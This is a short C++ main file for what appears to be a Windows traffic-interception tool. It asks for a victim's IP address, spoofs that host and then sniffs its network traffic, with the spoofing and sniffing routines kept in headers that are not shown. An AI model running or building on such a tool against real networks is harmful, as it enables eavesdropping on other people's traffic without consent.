//#define HAVE_REMOTE
#pragma warning
#include "Components.h"
#include "SniffTraffic.h"

std::string victim;

BOOL WINAPI CtrlCHandler(DWORD dwCtrlType) {
	if (dwCtrlType == CTRL_C_EVENT) {
		StopSpoofingVictim(victim);
		return TRUE;
	}
	return FALSE;
}

int main(int argc, char **argv)
{
	
	std::cout << "Please enter a valid ip of victim\n>";
	std::cin >> victim;

	SetConsoleCtrlHandler(CtrlCHandler, TRUE);
	SpoofVictim(victim);
	//system("pause");

	SniffTraffic st;
	st.SniffByFilter();

	return 0;
}
